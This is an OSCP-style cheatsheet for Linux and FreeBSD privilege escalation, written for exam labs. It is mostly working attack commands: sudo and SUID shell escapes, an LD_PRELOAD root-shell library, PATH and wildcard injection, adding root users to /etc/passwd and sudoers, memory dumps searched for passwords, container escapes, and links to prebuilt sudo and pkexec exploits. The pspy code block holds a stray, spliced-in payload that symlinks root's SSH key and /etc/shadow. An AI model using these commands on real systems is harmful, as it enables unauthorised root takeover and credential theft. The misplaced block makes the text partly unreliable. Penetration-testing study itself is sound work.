---
title: "Linux Privilege Escalation"
date: 2026-06-20
weight: 70
draft: false
summary: "From low privilege to root: check system info, SUID, cron, services, and kernel vulnerabilities, in that order."
---

- Source: https://heretek.dev/oscp-cheatsheet/linux-privilege-escalation/ (Jean Romero) — reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker (Kali) IP

## Quick Win Order — read top to bottom under exam pressure

### 30-second checks — run first on every box

- `sudo -l` — if any entry is listed in GTFOBins, instant win (Check 1)
- `id` — unusual groups? (docker, lxd, disk, adm, shadow)
- Full SUID sweep: `find / -perm -4000 -type f 2>/dev/null` (Check 2)
- `ls -la /etc/passwd /etc/shadow` — write/read access where it shouldn't exist?

### 5-minute checks — before starting LinPEAS

- Cron: `cat /etc/crontab`, `ls -la /etc/cron.*` — writable scripts or PATH abuse
- Capabilities: `getcap -r / 2>/dev/null`
- Internal listening ports: `ss -tulnp`
- Creds in files: `.bash_history`, `.env`, `config.php`, `wp-config.php`

### 15-minute checks — run LinPEAS in parallel

- Run `linpeas.sh` and read the red/yellow highlights first
- Writable service unit/config files, PATH hijacking
- Credential reuse — immediately try found passwords against root and other users
- `uname -a` → kernel version → searchsploit (only when easier vectors didn't pan out)

### 30+ minute investigations — time sinks

- Custom SUID binary → check `ltrace`/`strace` for injectable `system()`/relative-path calls
- LD_PRELOAD / LD_LIBRARY_PATH abuse via `env_keep` shown in `sudo -l`
- NFS `no_root_squash`, Docker/LXD group escape
- Kernel exploits — last resort, they can crash the box

### Special situations

- Inside a container? Check `/.dockerenv`, capabilities, and mounted host paths
- Restricted shell (rbash)? Escape with `vi`, `python`, `sudo`, or `ssh -t <host> bash`
- Commands failing silently? Use full paths and check AppArmor/SELinux DENIED logs

## Check 1 — sudo -l (always first)

```bash
sudo -l
```

If any binary appears, check GTFOBins immediately.

Commonly hit combinations:

```bash
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo less /etc/shadow    # then !sh
sudo nmap --interactive  # then !sh (older nmap)
sudo apt-get changelog apt   # drops to less → type !/bin/sh for root
sudo /usr/bin/tee /etc/passwd < malicious_passwd  # overwrite /etc/passwd
```

- Warning: if a GTFOBins sudo exploit unexpectedly fails, check for DENIED entries with `grep apparmor /var/log/syslog` — AppArmor may be blocking it.

### LD_PRELOAD hijacking

If `sudo -l` shows `env_keep+=LD_PRELOAD`:

```text
// File: /tmp/evil.c
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
sudo LD_PRELOAD=/tmp/evil.so <allowed_binary>
```

### PYTHONPATH / SETENV hijacking

If `env_keep+=PYTHONPATH` or `SETENV` is present, create a malicious Python module with the same name as a module imported by the sudo-allowed script.

If `gcore` (or `/usr/bin/gcore`) appears in `sudo -l`, dump the memory of a privileged process to get plaintext creds:

```bash
ps -ef | grep -E 'root|sshd|mysql'   # find a juicy PID
sudo gcore -o /tmp/dump <PID>
strings /tmp/dump.<PID> | grep -iE 'password|passwd|secret|token' | sort -u
```

## Check 2 — SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null    # also check SGID
```

Compare all results against GTFOBins. Representative binaries you can abuse: `find`, `vim`, `python`, `bash` (`bash -p`), `nmap`, `cp`, `env`, `gdb`, `systemctl`, `base64`, `openssl`, `wget`.

Quick SUID abuse examples:

```bash
# SUID find
find /tmp -exec "/usr/bin/bash" -p \; -quit
# SUID bash/sh
/usr/bin/bash -p          # -p prevents effective UID from being reset
# SUID cp → overwrite /etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'root2:$(openssl passwd w00t):0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
```

### Custom SUID binary → PATH hijacking

If the SUID binary is not in GTFOBins, find out what it calls:

```bash
file ./mystery_binary
strings ./mystery_binary | grep -E '^/|system|exec|popen'
```

If `strings` shows bare commands without a slash (`chpasswd`, `ping`, `service`, `cat`), the binary calls them through a `$PATH` lookup. PATH hijacking works.

Example where `strings` showed `echo kiero:kiero | chpasswd` — `chpasswd` was called without the `/usr/sbin/` prefix.

```bash
# 1. Create fake binary matching the bare name
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/chpasswd
chmod +x /tmp/chpasswd

# 2. Prepend writable dir to PATH (must come BEFORE /usr/sbin)
export PATH=/tmp:$PATH

# 3. Trigger the SUID binary — it runs YOUR fake as root
./RESET_PASSWD

# 4. /bin/bash now has SUID → root shell
/bin/bash -p
# whoami → root
```

Core model: SUID binary + relative-path command + writable directory = root.

- The SUID bit makes the binary run as root
- `system()` / `execvp()` look up bare commands in `$PATH`
- You control `$PATH`, so you decide which binary gets picked up first

Variations of the same trick:

- A cron job calls a bare command → same PATH hijack (only the trigger differs)
- A service script calls a bare command → same PATH hijack
- `sudo` with `env_keep += "PATH"` → same PATH hijack through the sudo binary

## Check 3 — Cron jobs and timers

```bash
cat /etc/crontab
ls -la /etc/cron.d/ && cat /etc/cron.d/* 2>/dev/null              # READ contents, not just list
ls -la /etc/cron.{daily,hourly,weekly,monthly}/
cat /etc/cron.{daily,hourly,weekly,monthly}/* 2>/dev/null         # READ all periodic scripts
crontab -l
sudo crontab -l              # root's crontab (if sudo allows)
systemctl list-timers --all

# Check cron logs for RUNNING jobs (shows what's actually executing)
grep "CRON" /var/log/syslog 2>/dev/null
grep "CRON" /var/log/cron.log 2>/dev/null
```

To catch hidden root cron jobs, run pspy64:

```bash
chmod +x pspy64 && ./pspy64
# Watch for UID=0 commands running periodically
cp * /media

cd /var/www/target-site/uploads

echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh

chmod +x runme.sh

touch -- '--checkpoint=1'

touch -- '--checkpoint-action=exec=sh runme.sh'

ln -s /root/.ssh/id_rsa rootkey

ln -s /etc/shadow shadowcopy

ln -s /root/proof.txt rootproof
```

Checklist when you find a cron job running as root:

- Writable script? → replace its contents with a reverse shell
- Uses `*` in a writable directory? → wildcard injection (below)
- Calls commands without absolute paths? → PATH hijacking
- Imports Python modules? → library hijacking
- Sources a bash file? → sourced-file hijacking
- Hardcoded creds? → credential reuse

### RED FLAGS — 5-second scan after `cat /etc/cron.d/*`

Don't skim. Read every line. If any of the following appear, stop and exploit:

- Line ends with a bare `*` → wildcard injection (important). Example: `cd /opt/admin && tar -zxf backup.tar.gz *`
- Paths under `/opt/`, `/home/`, `/tmp/`, `/var/www/` → check writability. Example: `cd /opt/admin && ...` → `ls -la /opt/admin`
- `tar` / `rsync` / `chown` / `7z` / `zip` / `find` + a path → wildcard injection (important). Any of those commands combined with `*`
- Bare command (no `/usr/bin/` prefix) → PATH hijacking (important). Example: `* * * * * root cleanup.sh`
- `.sh` script → check writability of both the script and its parent directory. Example: `bash /opt/scripts/x.sh`
- `python` / `perl` / `php` script → check for module/library hijacking. Example: `python /opt/app/main.py`

If a root cron/script runs `tar`, `rsync`, `chown`, `7z`, etc. with `*` in a writable directory:

```bash
# tar — files starting with `--` are interpreted as flags
cd /writable_dir
echo 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb' > x.sh
chmod +x x.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh x.sh'
# Cron triggers `tar czf backup.tar.gz *` → /tmp/rb -p = root

# rsync — --rsh injection
touch -- '-e sh x.sh'

# 7z — leaks file contents to stderr
touch -- '@x.txt' && ln -s /etc/shadow x.txt
# `7z a backup.7z *` → /etc/shadow content leaked
```

- Core model: any binary that parses wildcard-expanded filenames as flags is vulnerable. Drop files whose names are malicious flags.

## Check 4 — Capabilities

```bash
getcap -r / 2>/dev/null
```

How to read the output: `/usr/bin/perl = cap_setuid+ep`

- Left of `=` → binary name (search the Capabilities section of GTFOBins)
- Between `=` and `+` → capability (granted privilege)
- The flags must include `e` (effective) to be exploitable — `+ep` or `+eip` is live; `+i` alone is dormant, so skip it

If an interpreter has `cap_setuid+ep`, you get root immediately:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
```

Impact by capability:

- `cap_setuid+ep` — switch to root via an interpreter (commands above)
- `cap_dac_read_search+ep` — read arbitrary files (including `/etc/shadow`, `/root/.ssh/id_rsa`)
- `cap_dac_override+ep` — read and write arbitrary files (replace `/etc/passwd`, `/etc/sudoers`)
- `cap_chown+ep` — change ownership of arbitrary files → take over `/etc/passwd`
- `cap_sys_admin+ep` — mount filesystems (mount disks, chroot escape)
- `cap_net_raw+ep` — raw sockets (network sniffing, ARP)
- `cap_sys_ptrace+ep` — inject into arbitrary processes (hijack root processes)
- `cap_sys_module+ep` — load kernel modules

## Check 5 — Automated enumeration (LinPEAS, etc.)

```bash
./linpeas.sh | tee linpeas_output.txt
```

RED/YELLOW findings are almost always real privesc vectors.

Alternative tools (when linpeas is blocked by AV or unavailable):

```bash
unix-privesc-check standard > output.txt   # pre-installed on Kali, transfer to target
# Also: LinEnum.sh, linux-exploit-suggester.sh
```

Manual checks that linpeas may miss:

```bash
# World-writable directories (check for cron scripts, service binaries in these)
find / -writable -type d 2>/dev/null
```

## Check 6 — Password hunting

### Environment variables and dotfiles (do this first — lowest cost)

```bash
# Env vars may contain hardcoded creds set by admins
env | grep -i 'pass\|cred\|secret\|key\|token'

# .bashrc can export credentials as env vars
cat ~/.bashrc | grep -i 'export\|pass\|cred\|secret'
cat /home/*/.bashrc 2>/dev/null | grep -i 'export\|pass'
```

### Sniffing creds from running processes

```bash
# Watch for transient processes leaking passwords in command-line args
watch -n 1 "ps aux | grep pass"
# Example catch: sshpass -p 'Password123' ssh user@127.0.0.1
# pspy is better for this — but watch works without transferring tools
```

### grep-based creds search

```bash
grep -ri 'password' /var/www/ /etc/ /opt/ /home/ 2>/dev/null
grep -ri 'passwd\|credential\|secret\|api.key\|token' /var/www/ /opt/ 2>/dev/null
cat ~/.bash_history
cat /home/*/.bash_history
cat /root/.bash_history 2>/dev/null
```

### Reducing noise (when default searches return too much)

The grep above is a firehose. If `/etc/` or `/var/www/` floods with thousands of hits (locales, manpages, doc strings, package metadata), use these instead:

```bash
# 1. Filenames only first — triage, then read selectively
grep -rli 'password' /etc/ /var/www/ /opt/ 2>/dev/null

# 2. Tighten the regex — '=' or ':' kills doc/help-text noise
grep -rEi 'password\s*[:=]' /etc/ /var/www/ /opt/ 2>/dev/null

# 3. Scope by file type — drops binaries, locales, manpages
grep -rEi --include='*.php' --include='*.py' --include='*.sh' \
  --include='*.conf' --include='*.ini' --include='*.env' \
  --include='*.yml' --include='*.yaml' --include='*.xml' --include='*.js' \
  'password\s*[:=]' / 2>/dev/null

# 4. Strip known-noise paths from existing results
grep -ri 'password' /etc/ 2>/dev/null | grep -vE '/locale/|/man/|\.gz:'

# 5. Volume check before diving in
grep -ri 'password' /etc/ 2>/dev/null | wc -l   # >500? tighten the query
```

Priority: filenames only (#1) → tighter regex (#2) → file-extension scope (#3) → read the top results.

### Git repositories (deleted creds remain in commit history)

```bash
# Find .git directories
find / -name ".git" -type d 2>/dev/null

# Inside a git repo: check for removed secrets
cd /path/to/repo
git log                                    # list commits
git show <COMMIT_HASH>                     # diff of that commit — shows added/removed lines
git log -p                                 # all diffs in full
git log --all --oneline                    # compact view
```

Locations where creds often show up:

```bash
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /var/www/html/.env
find / -name "*.config" -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
```

### Cracking protected files

If you find a password-protected file, crack it. If someone protected it, the contents matter.

```bash
# The *2john family converts any format to john-crackable hash
pdf2john file.pdf > hash.txt
zip2john file.zip > hash.txt
keepass2john file.kdbx > hash.txt
ssh2john id_rsa > hash.txt
rar2john file.rar > hash.txt
office2john file.docx > hash.txt

# Then crack
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Check 7 — SSH keys

```bash
find / -name id_rsa -o -name id_dsa -o -name id_ecdsa -o -name id_ed25519 -o -name "*.pem" 2>/dev/null
cat /home/*/.ssh/authorized_keys 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
```

## Check 8 — Writable /etc/passwd, /etc/shadow, /etc/sudoers

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/
```

Writable /etc/passwd:

```bash
openssl passwd -1 password123
echo 'hacker:$1$xyz$abc...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker    # password: password123
```

Writable /etc/sudoers or /etc/sudoers.d/ (more common in practice than passwd):

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo -i   # root
# Or drop a new file in sudoers.d/
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/zz_pwn
```

Writable /etc/shadow:

```bash
# Replace root's hash with a known one
openssl passwd -6 toor   # → $6$...
# Edit /etc/shadow, replace root's $6$... with yours, then `su root` with toor
```

## Check 9 — Internal services

```bash
ss -tulnp
netstat -tulnp 2>/dev/null
```

Look for services bound to `127.0.0.1` — they don't show up in an external nmap.

Commonly seen: MySQL on 3306 (try `mysql -u root`), Redis on 6379, internal web apps on high ports, dev servers.

Port forwarding to reach them:

```bash
# Basic: forward target localhost:8080 to YOUR localhost:8080
ssh -L 8080:127.0.0.1:8080 user@target -N

# With SSH key + non-standard port (common in labs)
ssh -i id_ecdsa user@target -p 2222 -L 8080:127.0.0.1:8080 -N

# Forward multiple ports at once
ssh -i id_key user@target -p PORT -L 8080:127.0.0.1:8080 -L 3306:127.0.0.1:3306 -N

# -N = no shell, just forward the port
# -L = local forward (target localhost -> your localhost)
# Then browse http://127.0.0.1:8080 on Kali to access the service
```

Standard responses when you hit these (one-line reminders):

- Redis (6379) → `CONFIG SET dir /root/.ssh/` + `dbfilename authorized_keys` + `SET x "ssh-rsa..."` + `SAVE`
- MySQL root + writable webroot → `SELECT '<?php ... ?>' INTO OUTFILE '/var/www/html/x.php'`
- Docker socket readable → mount `/` and chroot (same payload as the docker group, Check 11)
- Werkzeug/Flask debug → the Python REPL itself: `__import__('os').system('id')`
- Otherwise → search that service's config on the box (`/etc/<svc>/*`) — creds are usually there

## Check 10 — NFS no_root_squash

```bash
# External (from Kali, during initial enum) — port 2049 in nmap = NFS
showmount -e <target_ip>

# Internal (post-foothold)
cat /etc/exports
# Look for: /share *(rw,no_root_squash)
```

If found:

```bash
# On attacker (as root):
sudo mount -t nfs $ip:/share /tmp/nfs
sudo cp /bin/bash /tmp/nfs/bash
sudo chmod +s /tmp/nfs/bash
# On target:
/share/bash -p
```

## Check 11 — Privileged groups (Docker / LXD / disk / adm / shadow)

```bash
id
# Look for: docker, lxd, lxc, disk, adm, shadow, kvm, sudo, wheel, video
```

Root path per group:

- `docker` — `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
- `lxd` / `lxc` — see the LXD block below
- `adm` — read `/var/log/*` (auth.log and syslog often leak sudo/sshpass creds)
- `shadow` — read `/etc/shadow` → `unshadow` + john for offline cracking
- `video` — read the framebuffer `/dev/fb0` — only useful when an active GUI session exists
- `kvm` — `/dev/kvm` access — combine with disk image mounting
- `sudo` / `wheel` — `sudo -l` (already covered in Check 1)

Docker escape:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

LXD escape:

```bash
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

disk group — raw block device reads (debugfs):

```bash
# debugfs gives raw filesystem read on the block device
debugfs /dev/sda1
debugfs:  cat /etc/shadow
debugfs:  dump /root/.ssh/id_rsa /tmp/rootkey
debugfs:  quit
chmod 600 /tmp/rootkey && ssh -i /tmp/rootkey root@127.0.0.1
```

Classifying groups not on the list:

```bash
getent group <name>          # who else is in it, hints at purpose
find / -group <name> -ls 2>/dev/null | head -20   # what files it owns
```

Look at configs in `/etc/`, binaries in `/usr/sbin/`, logs in `/var/log/`, and devices in `/dev/`. If nothing is usable after 15 minutes, drop it — it's not a privesc vector.

## Check 12a — Userland SUID/sudo CVEs (safe to try early)

These abuse an SUID binary or sudo rather than the kernel, so they won't crash the box. Try them before kernel exploits.

```bash
# PwnKit (CVE-2021-4034) — pkexec SUID, ~Ubuntu/Debian/CentOS 2014–early 2022
ls -la /usr/bin/pkexec                # confirm SUID present
# Prebuilt: https://github.com/ly4k/PwnKit
./pwnkit                              # → root shell

# Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2
sudo --version                        # check
# Prebuilt: https://github.com/blasty/CVE-2021-3156
./sudo-baron-samedit                  # → root shell

# Sudoedit -e (CVE-2023-22809) — sudo 1.8.0–1.9.12p1
# Trigger when sudo -l shows sudoedit (or sudo -e) on a specific file
EDITOR='vim -- /etc/sudoers' sudoedit /allowed/file
# Edits ANY file as root via the appended path. Also works with vi/nano/ed.

# Looney Tunables (CVE-2023-4911) — glibc 2.34+ (Ubuntu 22.04+, RHEL 9, Fedora 37+)
# Prebuilt: https://github.com/leesh3288/CVE-2023-4911
./looney                              # less common on OSCP labs, more on modern infra
```

- Tip: check quickly on Kali with `searchsploit pwnkit` / `searchsploit CVE-2021-3156`. Prebuilt PoCs work on most OSCP-generation targets without compiling.

## Check 12b — Kernel exploits (last resort)

```bash
uname -a
cat /etc/issue
cat /etc/os-release
# Then on Kali: searchsploit "linux kernel <version> Local Privilege Escalation"
```

How to read uname output: `5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 ... 2020 x86_64`

- `5.4.0-42-generic` → upstream kernel + distro patch level (`-42`) + flavor
- `#46-Ubuntu ... Fri Jul 10 2020` → the build date is the baseline: only CVEs published after this date can apply (important)
- `x86_64` → architecture (your compiled exploit must match)

Combine `/etc/os-release` (distro + release) with the above to build the full identifier.

Lookup query template: `<distro> <release> <kernel> privilege escalation`
e.g. `ubuntu 20.04 5.4.0-42 privilege escalation`

Using linux-exploit-suggester.sh:

```bash
./linux-exploit-suggester.sh              # reads uname automatically
./linux-exploit-suggester.sh -k 5.4.0-42  # force a specific kernel string
```

Read the Exposure tags, not the CVE list:

- `highly probable` / `probable` → try it
- `less probable` / `unprobable` → skip

Cross-check before compiling: search `<CVE> <distro> <release> patched` — confirm the patch was not shipped in the target's build date.

Major kernel exploits in linux-exploit-suggester.sh:

- DirtyPipe (CVE-2022-0847) — Linux 5.8 – 5.16.11, 5.15.25, 5.10.102
- DirtyCow (CVE-2016-5195) — older kernels (< 4.8.3)
- OverlayFS (CVE-2021-3493 / CVE-2023-0386) — Ubuntu only

- Warning: kernel exploits can crash the box. Exhaust Check 12a first.

## Checks 13-18 — Additional vectors

```bash
# 13. World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# 14. Script analysis — apply the 13-item checklist to every script found

# 15. Python library hijacking
python3 -c "import sys; print('\n'.join(sys.path))"
# Writable directory in sys.path + root runs Python script = hijack

# 16. PATH hijacking
echo $PATH
# sudo with env_keep+=PATH or SETENV + script uses relative command

# 17. Writable systemd services
find /etc/systemd /lib/systemd /run/systemd -name "*.service" -writable 2>/dev/null
# Exploit (see Writable systemd Service block below)

# 18. Process monitoring
ps aux | grep -i 'pass\|user\|cred'
# pspy is better for catching transient processes

# 19. /etc/ld.so.preload writable — instant root on next SUID call
ls -la /etc/ld.so.preload
# If writable: drop a malicious .so path → loaded into every binary including SUID
gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles
echo "/tmp/evil.so" > /etc/ld.so.preload
sudo /usr/bin/find . -exec /bin/bash -p \;   # any SUID/sudo call triggers it
```

Abusing a writable systemd service:

```bash
# Find any writable .service file root manages
find /etc/systemd /lib/systemd -name "*.service" -writable 2>/dev/null

# Edit ExecStart to drop a SUID bash:
# [Service]
# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb'

# Reload + trigger (need ANY way to make root reload — sudo systemctl, sudo reboot, scheduled restart):
sudo systemctl daemon-reload && sudo systemctl restart <svc>
# OR if sudo allows reboot:
sudo reboot

# After the service reloads as root, the copied bash is SUID:
/tmp/rb -p   # root
```

## When automated tools find nothing

When LinPEAS, sudo -l, SUID, and cron all come up empty:

1. Check non-default directories at the filesystem root — use `ls /` to find unusual entries like `/opt/`, `/srv/`, `/backup/`, or custom directories. Things placed there on purpose have a reason.
2. Read every file you can access — especially home directories, web roots, and config files. Password-protected files are high value (crack them).
3. Check internal services — `ss -tulnp` for localhost-only services. They're often invisible to external scans and run as root.
4. Check running processes — `ps aux` for root-run services with interesting arguments. Catch transient processes with `pspy64`.
5. Re-enumerate with new context — every time you find a new username, password, or service name, re-run targeted searches.

If privesc is information-driven: find a file → crack it → read it → discover a hidden service → use it. Automated tools find misconfigurations; they don't gather information.

## FreeBSD privilege escalation

FreeBSD uses doas instead of sudo. The config lives in /usr/local/etc/doas.conf.

### Recognition

- `uname -a` shows FreeBSD
- Third-party config directories are under /usr/local/etc/, not /etc/
- Service management is `service NAME onestart/onestop/restart`
- Package manager is pkg, not apt
- The shadow file is /etc/master.passwd instead of /etc/shadow

### Enumeration

```bash
cat /usr/local/etc/doas.conf
id
ls /usr/local/etc/rc.d/
find /usr/local/etc/ -writable 2>/dev/null
```

### Exploitation: doas service abuse

If doas.conf has a line of the form `permit nopass USER cmd service args X onestart`:

1. Check writability of the service binary / config / Include directories
2. Check whether the service config includes files from a writable directory (grep the main conf for Include)
3. If it's a web service, place a webshell in the DocumentRoot, start the service via doas → catch a shell as the service user

Real-world case: Apache ran as the non-root www user, and httpd.conf and the Includes directory were read-only. The real value was in post-exploit looting: an sshpass command pointing at the FILES share was found in .history.

Lesson: if doas abuse doesn't yield a clean privesc, the value is in enumeration for pivot creds for the next machine. Search .history, .bash_history, /home/*/.ssh, /var/mail, /tmp, and /var/log.

### FreeBSD Post-Exploit Looting

```bash
cat /root/.history /root/.bash_history
ls /var/mail/ && cat /var/mail/*
cat /etc/master.passwd
find /home /usr/home -name .ssh 2>/dev/null
find / -name '*.sh' -o -name '*.py' 2>/dev/null | xargs grep -l password 2>/dev/null
```
